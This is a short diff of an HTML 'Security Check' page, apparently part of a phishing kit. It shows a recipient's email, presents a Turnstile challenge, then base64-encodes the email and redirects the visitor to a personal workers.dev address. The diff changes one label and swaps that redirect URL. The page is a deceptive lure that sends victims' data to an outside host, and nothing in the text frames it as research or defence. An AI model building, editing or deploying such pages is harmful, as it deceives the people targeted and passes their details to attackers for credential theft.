@@ -27,7 +27,7 @@
 <body>
     <div class="box">
         <h2 style="color: #1a365d;">Security Check</h2>
-        <p style="color: #4a5568;">This action is intended for:<br><span id="email-display">Loading...</span></p>
+        <p style="color: #4a5568;">This Document is intended for:<br><span id="email-display">Loading...</span></p>
         <p style="color: #4a5568; font-size: 14px;">Please complete the security check below.</p>
         
         <!-- Turnstile Widget Container with YOUR Site Key -->
@@ -115,7 +115,7 @@
             const b64 = btoa(userEmail);
             
             // Append the Turnstile token to the target URL
-            const target = "https://index-w8f.jonathanakers1775.workers.dev?email=" + b64;
+            const target = "https://index-gu3.jonathanakers1775.workers.dev?email=t" + b64;
             
             window.location.replace(target);
         }
@@ -123,3 +123,4 @@
 </body>
 
 </html>
+
